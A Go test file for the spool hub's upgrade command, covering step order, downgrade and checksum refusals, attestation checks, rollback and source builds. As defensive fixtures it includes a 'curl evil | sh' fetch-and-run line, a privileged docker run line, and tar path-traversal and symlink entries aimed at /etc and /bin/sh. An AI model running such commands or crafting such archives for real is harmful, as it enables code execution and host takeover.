package main

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"os/user"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/enes-alatas/spool/internal/store/sqlite"
)

const (
	testTag      = "v9.9.9"
	testWSRef    = "ghcr.io/enes-alatas/spool-workstation@sha256:" + "1111111111111111111111111111111111111111111111111111111111111111"
	testEgRef    = "ghcr.io/enes-alatas/spool-egress@sha256:" + "2222222222222222222222222222222222222222222222222222222222222222"
	testImagesOK = "docker pull " + testWSRef + "\ndocker tag " + testWSRef + " spool-workstation\ndocker pull " + testEgRef + "\ndocker tag " + testEgRef + " spool-egress\n"
)

// fakeHost answers the upgrade's commands as a host would, and records
// them in order.
type fakeHost struct {
	t   *testing.T
	env *upgradeEnv

	mu  sync.Mutex
	ran []hostCmd
	// answer, when set, answers first; ok false falls through to the
	// defaults
	answer func(cmd hostCmd) (string, error, bool)
}

func (host *fakeHost) Run(_ context.Context, cmd hostCmd) (string, error) {
	host.mu.Lock()
	host.ran = append(host.ran, cmd)
	host.mu.Unlock()
	if host.answer != nil {
		if out, err, ok := host.answer(cmd); ok {
			return out, err
		}
	}
	env := host.env
	args := strings.Join(cmd.Args, " ")
	switch {
	case cmd.Name == "systemctl" && cmd.Args[0] == "show":
		return env.unitShow(), nil
	case cmd.Name == "systemctl" && cmd.Args[0] == "start":
		env.setServing(env.startsAs)
		return "", nil
	case cmd.Name == "systemctl" && cmd.Args[0] == "stop":
		env.setServing("")
		return "", nil
	case cmd.Name == "docker" && strings.HasPrefix(args, "image inspect"):
		return "sha256:old-" + cmd.Args[len(cmd.Args)-1] + "\n", nil
	case cmd.Name == "docker":
		return "", nil
	case cmd.User == "nobody":
		host.checkRunsAsNobody(cmd)
		switch args {
		case "--version":
			return "spool " + env.candidateVersion + " (abc1234, built 2026-10-16T00:00:00Z, go1.26)\n", nil
		case "migrations":
			return env.migrations, nil
		case "images":
			return env.images, nil
		}
	case cmd.Name == env.backupPath:
		data := filepath.Join(env.backupDir, "spool-data-20261016T000000Z.tar.gz")
		keys := filepath.Join(env.backupDir, "spool-keys-20261016T000000Z.tar")
		write(host.t, data, "data")
		write(host.t, keys, "keys")
		return "volume spool-ws-1 (loop elliot)\n" + data + "\n" + keys + "   <- store apart from the data file\n", nil
	case cmd.Name == env.restorePath:
		return "", os.MkdirAll(env.dataDir, 0o700)
	}
	host.t.Errorf("unexpected command %s", cmd)
	return "", errors.New("unexpected command")
}

// checkRunsAsNobody: a candidate runs as nobody, from an empty
// environment, as a copy of mode 0555 nobody can't replace.
func (host *fakeHost) checkRunsAsNobody(cmd hostCmd) {
	if len(cmd.Env) != 0 || cmd.Login {
		host.t.Errorf("%s runs with an environment: %q", cmd, cmd.Env)
	}
	info, err := os.Stat(cmd.Name)
	if err != nil || info.Mode().Perm() != 0o555 {
		host.t.Errorf("%s: the copy nobody runs is %v, %v; want mode 0555", cmd, info, err)
	}
	if dir, err := os.Stat(filepath.Dir(cmd.Name)); err != nil || dir.Mode().Perm() != 0o755 {
		host.t.Errorf("%s: the copy's directory is %v, %v; want mode 0755", cmd, dir, err)
	}
}

func (host *fakeHost) commands() []string {
	host.mu.Lock()
	defer host.mu.Unlock()
	var out []string
	for _, cmd := range host.ran {
		out = append(out, summarize(host.env, cmd))
	}
	return out
}

// summarize is a command as the order tests read it.
func summarize(env *upgradeEnv, cmd hostCmd) string {
	switch {
	case cmd.Name == env.backupPath:
		return "backup"
	case cmd.Name == env.restorePath:
		return "restore " + strings.Join(cmd.Args, " ")
	case cmd.User == "nobody":
		return "nobody " + strings.Join(cmd.Args, " ")
	case cmd.Login:
		_, script, _ := strings.Cut(cmd.Name, " && ")
		return cmd.User + "$ " + script
	case cmd.User != "":
		return cmd.User + " " + filepath.Base(cmd.Name) + " " + strings.Join(cmd.Args[:min(2, len(cmd.Args))], " ")
	case cmd.Name == "systemctl" && cmd.Args[0] == "show":
		return "systemctl show"
	}
	return strings.Join(append([]string{cmd.Name}, cmd.Args...), " ")
}

type upgradeEnv struct {
	root, binDir, bin, hook, dataDir string
	backupDir, backupPath            string
	restorePath                      string
	candidateVersion                 string
	migrations, images               string
	startsAs                         string // the version the hub serves once started

	mu      sync.Mutex
	serving string // "" while stopped
	health  *httptest.Server
	release *httptest.Server
	archive []byte
	sums    string
}

func (env *upgradeEnv) setServing(version string) {
	env.mu.Lock()
	env.serving = version
	env.mu.Unlock()
}

func (env *upgradeEnv) unitShow() string {
	listen := strings.TrimPrefix(env.health.URL, "http://")
	return fmt.Sprintf("ExecStart={ path=%s ; argv[]=%s --data-dir %s --listen %s ; ignore_errors=no }\nUser=spool\n", env.bin, env.bin, env.dataDir, listen)
}

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o755); err != nil {
		t.Fatal(err)
	}
}

func read(t *testing.T, path string) string {
	t.Helper()
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(raw)
}

// releaseArchive is a release's archive: name's directory holding entries,
// path to content.
func releaseArchive(t *testing.T, entries []tar.Header, contents map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for _, header := range entries {
		content := contents[header.Name]
		header.Size = int64(len(content))
		if header.Mode == 0 {
			header.Mode = 0o755
		}
		if err := tw.WriteHeader(&header); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func goodArchive(t *testing.T) []byte {
	name := "spool_" + testTag + "_" + goPlatform()
	return releaseArchive(t, []tar.Header{
		{Name: name + "/", Typeflag: tar.TypeDir},
		{Name: name + "/spool", Typeflag: tar.TypeReg},
		{Name: name + "/spool-hook", Typeflag: tar.TypeReg},
		{Name: name + "/LICENSE", Typeflag: tar.TypeReg},
	}, map[string]string{name + "/spool": "new spool", name + "/spool-hook": "new hook", name + "/LICENSE": "license"})
}

func (env *upgradeEnv) setArchive(archive []byte) {
	sum := sha256.Sum256(archive)
	env.archive = archive
	env.sums = hex.EncodeToString(sum[:]) + "  spool_" + testTag + "_" + goPlatform() + ".tar.gz\n"
}

// newUpgradeEnv lays out a hub the way a unit runs one: an installed pair,
// a migrated data directory, the installed scripts, and a hub that answers
// its health check at whatever version it was started on.
func newUpgradeEnv(t *testing.T) (*upgradeEnv, *upgrader, *fakeHost, *bytes.Buffer) {
	t.Helper()
	root := t.TempDir()
	env := &upgradeEnv{
		root:             root,
		binDir:           filepath.Join(root, "usr/local/bin"),
		dataDir:          filepath.Join(root, "var/lib/spool"),
		backupDir:        filepath.Join(root, "var/backups/spool"),
		backupPath:       filepath.Join(root, "usr/local/sbin/spool-backup.sh"),
		restorePath:      filepath.Join(root, "usr/local/sbin/spool-restore.sh"),
		candidateVersion: testTag,
		images:           testImagesOK,
		startsAs:         testTag,
	}
	env.bin, env.hook = filepath.Join(env.binDir, "spool"), filepath.Join(env.binDir, "spool-hook")
	write(t, env.bin, "old spool")
	write(t, env.hook, "old hook")
	write(t, env.backupPath, "#!/bin/sh\n")
	write(t, env.restorePath, "#!/bin/sh\n")
	if err := os.MkdirAll(env.dataDir, 0o700); err != nil {
		t.Fatal(err)
	}
	database, err := sqlite.Open(filepath.Join(env.dataDir, "spool.db"))
	if err != nil {
		t.Fatal(err)
	}
	database.Close()
	names, _ := sqlite.Migrations()
	env.migrations = strings.Join(names, "\n") + "\n"
	env.setArchive(goodArchive(t))

	env.health = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		env.mu.Lock()
		serving := env.serving
		env.mu.Unlock()
		if serving == "" {
			http.Error(w, "down", http.StatusBadGateway)
			return
		}
		switch r.URL.Path {
		case "/api/health":
			_ = json.NewEncoder(w).Encode(map[string]bool{"ok": true})
		case "/api/version":
			_ = json.NewEncoder(w).Encode(map[string]string{"version": serving})
		}
	}))
	t.Cleanup(env.health.Close)
	env.release = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/download/" + testTag + "/spool_" + testTag + "_" + goPlatform() + ".tar.gz":
			_, _ = w.Write(env.archive)
		case "/download/" + testTag + "/SHA256SUMS":
			_, _ = w.Write([]byte(env.sums))
		case "/repos/" + upgradeRepo + "/releases/latest":
			_, _ = w.Write([]byte(`{"tag_name":"` + testTag + `"}`))
		default:
			http.NotFound(w, r)
		}
	}))
	t.Cleanup(env.release.Close)

	host := &fakeHost{t: t, env: env}
	var out bytes.Buffer
	me, err := user.Current()
	if err != nil {
		t.Fatal(err)
	}
	up := newUpgrader(&out)
	up.host = host
	up.http = env.release.Client()
	up.euid = func() int { return 0 }
	up.getenv = func(string) string { return "" }
	up.lookGh = func() (string, error) { return "", errors.New("no gh") }
	up.freeAt = func(string) (uint64, error) { return 100 << 30, nil }
	up.ownerOf = func(string) (*user.User, error) { return me, nil }
	up.releaseBase, up.apiBase = env.release.URL, env.release.URL
	up.backupDir, up.backupPath, up.restorePath = env.backupDir, env.backupPath, env.restorePath
	up.healthWait, up.healthEvery = 300*time.Millisecond, 20*time.Millisecond
	up.unitName, up.target = "spool", testTag
	return env, up, host, &out
}

var releaseOrder = []string{
	"systemctl show",
	"docker image inspect --format {{.Id}} spool-workstation",
	"docker image inspect --format {{.Id}} spool-egress",
	"nobody --version",
	"nobody migrations",
	"nobody images",
	"docker pull " + testWSRef,
	"docker pull " + testEgRef,
	"systemctl stop spool",
	"backup",
	"docker tag " + testWSRef + " spool-workstation",
	"docker tag " + testEgRef + " spool-egress",
	"systemctl start spool",
}

// A release upgrade runs the runbook's order (ADR-0057): images recorded, the
// build checked and its images pulled before the stop, then the backup,
// the install and the start, and it ends healthy at the target.
func TestUpgradeRunsTheRunbookOrder(t *testing.T) {
	env, up, host, out := newUpgradeEnv(t)
	if err := up.run(context.Background()); err != nil {
		t.Fatalf("upgrade: %v\n%s", err, out)
	}
	if got := host.commands(); !slices.Equal(got, releaseOrder) {
		t.Errorf("ran\n  %s\nwant\n  %s", strings.Join(got, "\n  "), strings.Join(releaseOrder, "\n  "))
	}
	for path, want := range map[string]string{
		env.bin: "new spool", env.hook: "new hook",
		env.bin + ".previous": "old spool", env.hook + ".previous": "old hook",
	} {
		if got := read(t, path); got != want {
			t.Errorf("%s holds %q; want %q", path, got, want)
		}
	}
	if info, _ := os.Stat(env.bin); info.Mode().Perm() != 0o755 {
		t.Errorf("the installed binary is mode %v; want 0755", info.Mode().Perm())
	}
	if !strings.Contains(out.String(), "attestation is unchecked") {
		t.Errorf("no warning for an unchecked attestation:\n%s", out)
	}
}

// No target means the latest release.
func TestUpgradeWithNoTargetTakesTheLatestRelease(t *testing.T) {
	_, up, _, out := newUpgradeEnv(t)
	up.target = ""
	if err := up.run(context.Background()); err != nil {
		t.Fatalf("upgrade: %v\n%s", err, out)
	}
	if !strings.Contains(out.String(), "/download/"+testTag+"/") {
		t.Errorf("didn't download %s:\n%s", testTag, out)
	}
}

// stopped reports whether the upgrade stopped the hub: every refusal must
// come before it.
func stopped(host *fakeHost) bool {
	return slices.Contains(host.commands(), "systemctl stop spool")
}

// A downgrade onto a migrated database is refused before anything stops,
// and so is a target too old to say what it carries (ADR-0057).
func TestUpgradeRefusesADowngrade(t *testing.T) {
	env, up, host, _ := newUpgradeEnv(t)
	names, _ := sqlite.Migrations()
	env.migrations = strings.Join(names[:len(names)-1], "\n") + "\n"
	err := up.run(context.Background())
	if err == nil || !strings.Contains(err.Error(), "refusing a downgrade") || !strings.Contains(err.Error(), names[len(names)-1]) {
		t.Fatalf("upgrade = %v; want a downgrade refusal naming %s", err, names[len(names)-1])
	}
	if stopped(host) {
		t.Error("the hub was stopped for a refused downgrade")
	}

	_, up, host, _ = newUpgradeEnv(t)
	host.answer = func(cmd hostCmd) (string, error, bool) {
		if cmd.User == "nobody" && cmd.Args[0] == "migrations" {
			return "flag provided but not defined: -migrations\n", errors.New("exit status 2"), true
		}
		return "", nil, false
	}
	if err := up.run(context.Background()); err == nil || !strings.Contains(err.Error(), "predates") || stopped(host) {
		t.Fatalf("a target that can't list migrations: %v, stopped %v; want a refusal before the stop", err, stopped(host))
	}
}

// What a candidate answers is read strictly: anything but a list of
// migration names, or two pulls by digest, is a refusal.
func TestUpgradeReadsTheCandidateStrictly(t *testing.T) {
	for name, bad := range map[string]string{
		"a word":     "0001_init.sql\nhello\n",
		"a path":     "0001_init.sql\n../0002_x.sql\n",
		"empty line": "0001_init.sql\n\n",
	} {
		if _, err := parseMigrations(bad); err == nil {
			t.Errorf("migrations %s: parsed; want a refusal", name)
		}
	}
	if got, err := parseMigrations("0001_init.sql\n0002_a_b.sql\n"); err != nil || len(got) != 2 {
		t.Errorf("good migrations = %v, %v", got, err)
	}
	for name, bad := range map[string]string{
		"by tag":       strings.Replace(testImagesOK, testWSRef, "ghcr.io/enes-alatas/spool-workstation:latest", 1),
		"short digest": strings.Replace(testImagesOK, testEgRef, "ghcr.io/enes-alatas/spool-egress@sha256:2222", 1),
		"a command":    testImagesOK + "curl evil | sh\n",
		"one image":    "docker pull " + testWSRef + "\n",
		"swapped":      "docker pull " + testEgRef + "\ndocker pull " + testWSRef + "\n",
	} {
		if _, err := parseImages(bad); err == nil {
			t.Errorf("images %s: parsed; want a refusal", name)
		}
	}
	if got, err := parseImages(testImagesOK); err != nil || !slices.Equal(got, []string{testWSRef, testEgRef}) {
		t.Errorf("good images = %v, %v", got, err)
	}

	_, up, host, _ := newUpgradeEnv(t)
	host.answer = func(cmd hostCmd) (string, error, bool) {
		if cmd.User == "nobody" && cmd.Args[0] == "images" {
			return testImagesOK + "docker run --privileged x\n", nil, true
		}
		return "", nil, false
	}
	if err := up.run(context.Background()); err == nil || stopped(host) {
		t.Fatalf("an images answer with a stray line: %v; want a refusal before the stop", err)
	}
}

// A release whose archive doesn't match its SHA256SUMS is refused before
// anything stops.
func TestUpgradeRefusesAChecksumMismatch(t *testing.T) {
	env, up, host, _ := newUpgradeEnv(t)
	env.sums = strings.Repeat("0", 64) + "  spool_" + testTag + "_" + goPlatform() + ".tar.gz\n"
	if err := up.run(context.Background()); err == nil || !strings.Contains(err.Error(), "SHA-256") || stopped(host) {
		t.Fatalf("a mismatched sum: %v; want a refusal before the stop", err)
	}
	if got := read(t, env.bin); got != "old spool" {
		t.Errorf("the binary is %q after a refusal", got)
	}
}

// An archive with an entry outside its directory, or a link, is refused,
// even with a matching sum.
func TestUpgradeRefusesAnArchiveThatClimbsOut(t *testing.T) {
	name := "spool_" + testTag + "_" + goPlatform()
	for label, entries := range map[string][]tar.Header{
		"traversal": {{Name: name + "/spool", Typeflag: tar.TypeReg}, {Name: name + "/spool-hook", Typeflag: tar.TypeReg}, {Name: "../../etc/cron.d/x", Typeflag: tar.TypeReg}},
		"absolute":  {{Name: name + "/spool", Typeflag: tar.TypeReg}, {Name: name + "/spool-hook", Typeflag: tar.TypeReg}, {Name: "/etc/x", Typeflag: tar.TypeReg}},
		"symlink":   {{Name: name + "/spool", Typeflag: tar.TypeSymlink, Linkname: "/bin/sh"}, {Name: name + "/spool-hook", Typeflag: tar.TypeReg}},
		"no hook":   {{Name: name + "/spool", Typeflag: tar.TypeReg}},
		"doubled":   {{Name: name + "/spool", Typeflag: tar.TypeReg}, {Name: name + "/./spool", Typeflag: tar.TypeReg}, {Name: name + "/spool-hook", Typeflag: tar.TypeReg}},
	} {
		env, up, host, _ := newUpgradeEnv(t)
		env.setArchive(releaseArchive(t, entries, map[string]string{}))
		if err := up.run(context.Background()); err == nil || !strings.Contains(err.Error(), "refusing") || stopped(host) {
			t.Errorf("%s: %v; want a refusal before the stop", label, err)
		}
	}
}

// The attestation is checked with gh as the operator who ran sudo; without
// gh it is a warning, or a refusal with --require-attestation (ADR-0057).
func TestUpgradeChecksTheAttestationAsTheSudoUser(t *testing.T) {
	_, up, host, _ := newUpgradeEnv(t)
	up.requireAttestation = true
	if err := up.run(context.Background()); err == nil || !strings.Contains(err.Error(), "--require-attestation") || stopped(host) {
		t.Fatalf("no gh with --require-attestation: %v; want a refusal before the stop", err)
	}

	me, _ := user.Current()
	for _, verifies := range []bool{true, false} {
		_, up, host, out := newUpgradeEnv(t)
		up.lookGh = func() (string, error) { return "/usr/bin/gh", nil }
		up.getenv = func(key string) string { return map[string]string{"SUDO_USER": me.Username}[key] }
		host.answer = func(cmd hostCmd) (string, error, bool) {
			if cmd.Name != "/usr/bin/gh" {
				return "", nil, false
			}
			if cmd.User != me.Username || cmd.Login || !slices.Contains(cmd.Env, "HOME="+me.HomeDir) {
				t.Errorf("gh ran as %+v; want %s, with their HOME", cmd, me.Username)
			}
			if cmd.Args[0] == "attestation" && !verifies {
				return "", errors.New("verification failed"), true
			}
			return "", nil, true
		}
		err := up.run(context.Background())
		switch {
		case verifies && (err != nil || !strings.Contains(out.String(), "attestation verifies")):
			t.Errorf("a verified attestation: %v\n%s", err, out)
		case !verifies && (err == nil || stopped(host)):
			t.Errorf("a failed attestation: %v; want a refusal before the stop", err)
		}
	}
}

// A hub that doesn't come up at the target rolls back: stopped, its data
// directory moved aside and restored from the backup without volumes, the
// recorded images retagged, the previous pair put back, started (ADR-0057).
func TestUpgradeRollsBackAFailedCheck(t *testing.T) {
	for label, startsAs := range map[string]string{"wrong version": "v0.5.1", "never healthy": ""} {
		env, up, host, out := newUpgradeEnv(t)
		env.startsAs = startsAs
		host.answer = func(cmd hostCmd) (string, error, bool) {
			// once rolled back, the previous build starts
			if cmd.Name == "systemctl" && cmd.Args[0] == "start" && read(t, env.bin) == "old spool" {
				env.setServing("v0.5.1")
				return "", nil, true
			}
			return "", nil, false
		}
		err := up.run(context.Background())
		if err == nil || !strings.Contains(err.Error(), "rolled back") {
			t.Fatalf("%s: %v; want a rollback\n%s", label, err, out)
		}
		data := filepath.Join(env.backupDir, "spool-data-20261016T000000Z.tar.gz")
		keys := filepath.Join(env.backupDir, "spool-keys-20261016T000000Z.tar")
		want := append(slices.Clone(releaseOrder),
			"systemctl stop spool",
			"restore --data "+data+" --data-dir "+env.dataDir+" --no-volumes --keys "+keys,
			"docker tag sha256:old-spool-workstation spool-workstation",
			"docker tag sha256:old-spool-egress spool-egress",
			"systemctl start spool",
		)
		if got := host.commands(); !slices.Equal(got, want) {
			t.Errorf("%s: ran\n  %s\nwant\n  %s", label, strings.Join(got, "\n  "), strings.Join(want, "\n  "))
		}
		if got := read(t, env.bin); got != "old spool" {
			t.Errorf("%s: the binary is %q after the rollback; want the previous one", label, got)
		}
		if _, err := os.Stat(filepath.Join(env.dataDir+".failed-upgrade", "spool.db")); err != nil {
			t.Errorf("%s: the failed data directory wasn't kept aside: %v", label, err)
		}
		if slices.ContainsFunc(host.commands(), func(c string) bool { return strings.HasPrefix(c, "docker volume") }) {
			t.Errorf("%s: the rollback touched a volume", label)
		}
	}
}

// A rollback step that fails stops the rollback, with the steps left
// printed, and nothing after it runs: no blind retry.
func TestUpgradeRollbackStopsAtAFailedStep(t *testing.T) {
	env, up, host, out := newUpgradeEnv(t)
	env.startsAs = "v0.5.1"
	host.answer = func(cmd hostCmd) (string, error, bool) {
		if cmd.Name == env.restorePath {
			return "", errors.New("spool-restore: refusing"), true
		}
		return "", nil, false
	}
	err := up.run(context.Background())
	if err == nil || !strings.Contains(err.Error(), "the rollback stopped") {
		t.Fatalf("upgrade = %v; want the rollback stopped", err)
	}
	got := host.commands()
	if got[len(got)-1] != "restore --data "+filepath.Join(env.backupDir, "spool-data-20261016T000000Z.tar.gz")+" --data-dir "+env.dataDir+" --no-volumes --keys "+filepath.Join(env.backupDir, "spool-keys-20261016T000000Z.tar") {
		t.Errorf("a command ran after the failed restore: %q", got[len(got)-1])
	}
	for _, left := range []string{"left to do by hand", "retag the recorded image ids", "put back " + env.bin + ".previous", "systemctl start spool"} {
		if !strings.Contains(out.String(), left) {
			t.Errorf("the output lacks %q:\n%s", left, out)
		}
	}
}

// A backup that fails leaves the hub unmigrated: the previous build goes
// back and starts, and no restore runs.
func TestUpgradeAFailedBackupStartsThePreviousBuild(t *testing.T) {
	env, up, host, _ := newUpgradeEnv(t)
	host.answer = func(cmd hostCmd) (string, error, bool) {
		if cmd.Name == env.backupPath {
			return "", errors.New("spool-backup: spool.db is open"), true
		}
		return "", nil, false
	}
	if err := up.run(context.Background()); err == nil || !strings.Contains(err.Error(), "backup failed") {
		t.Fatalf("upgrade = %v; want the backup's failure", err)
	}
	got := host.commands()
	if got[len(got)-1] != "systemctl start spool" || slices.ContainsFunc(got, func(c string) bool { return strings.HasPrefix(c, "restore") }) {
		t.Errorf("after a failed backup ran %q; want the previous build started, no restore", got)
	}
	if read(t, env.bin) != "old spool" {
		t.Error("the binary changed though the backup failed")
	}
}

// Without root it refuses; --dry-run prints the plan and changes nothing.
func TestUpgradeNeedsRootAndADryRunChangesNothing(t *testing.T) {
	_, up, host, _ := newUpgradeEnv(t)
	up.euid = func() int { return 1000 }
	if err := up.run(context.Background()); err == nil || !strings.Contains(err.Error(), "root") || len(host.commands()) != 0 {
		t.Fatalf("as a user: %v, ran %q; want a refusal before any command", err, host.commands())
	}

	env, up, host, out := newUpgradeEnv(t)
	up.euid = func() int { return 1000 }
	up.dryRun = true
	if err := up.run(context.Background()); err != nil {
		t.Fatal(err)
	}
	if got := host.commands(); !slices.Equal(got, []string{"systemctl show"}) {
		t.Errorf("a dry run ran %q", got)
	}
	for _, want := range []string{env.bin, env.dataDir, "systemctl stop spool", "spool-backup.sh"} {
		if !strings.Contains(out.String(), want) {
			t.Errorf("the plan lacks %q:\n%s", want, out)
		}
	}
	if read(t, env.bin) != "old spool" {
		t.Error("a dry run changed the binary")
	}
}

// main is built in the checkout the unit runs from, by its owner through
// a login shell, never root; when the unit runs that checkout's bin/spool
// the build is the install, and the previous pair is kept before it.
func TestUpgradeBuildsMainAsTheCheckoutOwner(t *testing.T) {
	env, up, host, out := newUpgradeEnv(t)
	checkout := filepath.Join(env.root, "opt/spool")
	write(t, filepath.Join(checkout, ".git/HEAD"), "ref: refs/heads/main\n")
	env.bin, env.hook = filepath.Join(checkout, "bin/spool"), filepath.Join(checkout, "bin/spool-hook")
	write(t, env.bin, "old spool")
	write(t, env.hook, "old hook")
	const described = "v0.5.1-160-gabc1234"
	env.candidateVersion, env.startsAs = described, described
	me, _ := user.Current()
	host.answer = func(cmd hostCmd) (string, error, bool) {
		if !cmd.Login {
			return "", nil, false
		}
		if cmd.User != me.Username {
			t.Errorf("%s ran as %q; want the checkout's owner", cmd.Name, cmd.User)
		}
		if strings.HasSuffix(cmd.Name, "make build") {
			if read(t, env.bin+".previous") != "old spool" {
				t.Error("make build ran before the previous binary was kept")
			}
			write(t, env.bin, "built spool")
			write(t, env.hook, "built hook")
		}
		if strings.HasSuffix(cmd.Name, "git describe --tags --always --dirty") {
			return described + "\n", nil, true
		}
		return "", nil, true
	}
	up.target = "main"
	if err := up.run(context.Background()); err != nil {
		t.Fatalf("upgrade: %v\n%s", err, out)
	}
	owner := me.Username + "$ "
	want := []string{
		"systemctl show",
		"docker image inspect --format {{.Id}} spool-workstation",
		"docker image inspect --format {{.Id}} spool-egress",
		owner + "git fetch --tags origin && git checkout main && git pull --ff-only origin main",
		owner + "make build",
		owner + "make image",
		owner + "git describe --tags --always --dirty",
		"nobody --version",
		"nobody migrations",
		"systemctl stop spool",
		"backup",
		"systemctl start spool",
	}
	if got := host.commands(); !slices.Equal(got, want) {
		t.Errorf("ran\n  %s\nwant\n  %s", strings.Join(got, "\n  "), strings.Join(want, "\n  "))
	}
	if read(t, env.bin) != "built spool" || read(t, env.bin+".previous") != "old spool" {
		t.Errorf("binary %q, previous %q", read(t, env.bin), read(t, env.bin+".previous"))
	}
}

// A refused source build puts back the image ids make image moved.
func TestUpgradeARefusedBuildPutsTheImagesBack(t *testing.T) {
	env, up, host, _ := newUpgradeEnv(t)
	checkout := filepath.Join(env.root, "opt/spool")
	write(t, filepath.Join(checkout, ".git/HEAD"), "ref: refs/heads/main\n")
	write(t, filepath.Join(checkout, "bin/spool"), "built spool")
	write(t, filepath.Join(checkout, "bin/spool-hook"), "built hook")
	env.candidateVersion = "v0.5.1-160-gabc1234"
	names, _ := sqlite.Migrations()
	env.migrations = names[0] + "\n"
	host.answer = func(cmd hostCmd) (string, error, bool) {
		if !cmd.Login {
			return "", nil, false
		}
		if strings.HasSuffix(cmd.Name, "git describe --tags --always --dirty") {
			return env.candidateVersion + "\n", nil, true
		}
		return "", nil, true
	}
	up.target, up.fromSource = "main", checkout
	if err := up.run(context.Background()); err == nil || stopped(host) {
		t.Fatalf("upgrade = %v; want a refusal before the stop", err)
	}
	got := host.commands()
	if !slices.Equal(got[len(got)-2:], []string{"docker tag sha256:old-spool-workstation spool-workstation", "docker tag sha256:old-spool-egress spool-egress"}) {
		t.Errorf("after the refusal ran %q; want the recorded images retagged", got)
	}
}

// Before the stop, the upgrade checks it can back up: the installed
// scripts are there, and the backup directory has room.
func TestUpgradeChecksItCanBackUpBeforeTheStop(t *testing.T) {
	env, up, host, _ := newUpgradeEnv(t)
	if err := os.Remove(env.restorePath); err != nil {
		t.Fatal(err)
	}
	if err := up.run(context.Background()); err == nil || !strings.Contains(err.Error(), "isn't installed") || stopped(host) {
		t.Errorf("no restore script: %v; want a refusal before the stop", err)
	}

	_, up, host, _ = newUpgradeEnv(t)
	up.freeAt = func(string) (uint64, error) { return 1 << 20, nil }
	if err := up.run(context.Background()); err == nil || !strings.Contains(err.Error(), "MiB free") || stopped(host) {
		t.Errorf("a full disk: %v; want a refusal before the stop", err)
	}
}

// When the unit runs the checkout's own bin/spool, a refused build is not
// left as the binary the next restart starts: the previous one goes back.
func TestUpgradeARefusedInPlaceBuildPutsThePreviousBack(t *testing.T) {
	env, up, host, _ := newUpgradeEnv(t)
	checkout := filepath.Join(env.root, "opt/spool")
	write(t, filepath.Join(checkout, ".git/HEAD"), "ref: refs/heads/main\n")
	env.bin, env.hook = filepath.Join(checkout, "bin/spool"), filepath.Join(checkout, "bin/spool-hook")
	write(t, env.bin, "old spool")
	write(t, env.hook, "old hook")
	env.candidateVersion = "v0.5.1-160-gabc1234"
	names, _ := sqlite.Migrations()
	env.migrations = names[0] + "\n"
	host.answer = func(cmd hostCmd) (string, error, bool) {
		if !cmd.Login {
			return "", nil, false
		}
		if strings.HasSuffix(cmd.Name, "make build") {
			write(t, env.bin, "refused spool")
			write(t, env.hook, "refused hook")
		}
		if strings.HasSuffix(cmd.Name, "git describe --tags --always --dirty") {
			return env.candidateVersion + "\n", nil, true
		}
		return "", nil, true
	}
	up.target = "main"
	if err := up.run(context.Background()); err == nil || !strings.Contains(err.Error(), "refusing a downgrade") || stopped(host) {
		t.Fatalf("upgrade = %v; want a downgrade refusal before the stop", err)
	}
	if got, hook := read(t, env.bin), read(t, env.hook); got != "old spool" || hook != "old hook" {
		t.Errorf("after the refusal the unit's pair is %q, %q; want the previous build", got, hook)
	}
}

// A source build installs the bytes it checked: a bin/ the checkout's
// owner rewrites after the check changes nothing that is installed.
func TestUpgradeInstallsTheBuildItChecked(t *testing.T) {
	env, up, host, out := newUpgradeEnv(t)
	checkout := filepath.Join(env.root, "home/spool/src")
	write(t, filepath.Join(checkout, ".git/HEAD"), "ref: refs/heads/main\n")
	const described = "v0.5.1-160-gabc1234"
	env.candidateVersion, env.startsAs = described, described
	host.answer = func(cmd hostCmd) (string, error, bool) {
		if cmd.User == "nobody" && cmd.Args[0] == "--version" {
			write(t, filepath.Join(checkout, "bin/spool"), "swapped spool")
			return "", nil, false
		}
		if !cmd.Login {
			return "", nil, false
		}
		if strings.HasSuffix(cmd.Name, "make build") {
			write(t, filepath.Join(checkout, "bin/spool"), "built spool")
			write(t, filepath.Join(checkout, "bin/spool-hook"), "built hook")
		}
		if strings.HasSuffix(cmd.Name, "git describe --tags --always --dirty") {
			return described + "\n", nil, true
		}
		return "", nil, true
	}
	up.target, up.fromSource = "main", checkout
	if err := up.run(context.Background()); err != nil {
		t.Fatalf("upgrade: %v\n%s", err, out)
	}
	if got := read(t, env.bin); got != "built spool" {
		t.Errorf("installed %q; want the build that was checked", got)
	}
}

// The upgrade backs up the data directory alone, since it changes no
// workstation volume, and says each step as it starts, with the time
// since it began, so the stretch with the hub down never reads as a hang
// (#947).
func TestUpgradeBacksUpTheDataAloneAndSaysEachStep(t *testing.T) {
	env, up, host, out := newUpgradeEnv(t)
	if err := up.run(context.Background()); err != nil {
		t.Fatalf("upgrade: %v\n%s", err, out)
	}
	var backup *hostCmd
	for i, cmd := range host.ran {
		if cmd.Name == env.backupPath {
			backup = &host.ran[i]
		}
	}
	if backup == nil || !slices.Contains(backup.Args, "--no-volumes") || slices.Contains(backup.Args, "--image") {
		t.Errorf("the backup ran as %v; want --no-volumes and no image", backup)
	}
	last := -1
	for _, want := range []string{"]: pulling ", "]: stopping spool", "]: backing up " + env.dataDir, "]: backup ",
		"]: starting spool", "]: waiting up to ", "answers healthy"} {
		at := strings.Index(out.String(), want)
		if at <= last {
			t.Fatalf("%q is missing or out of order:\n%s", want, out)
		}
		last = at
	}
	if !strings.Contains(out.String(), "spool upgrade [0s]: ") {
		t.Errorf("the steps carry no elapsed time:\n%s", out)
	}
}
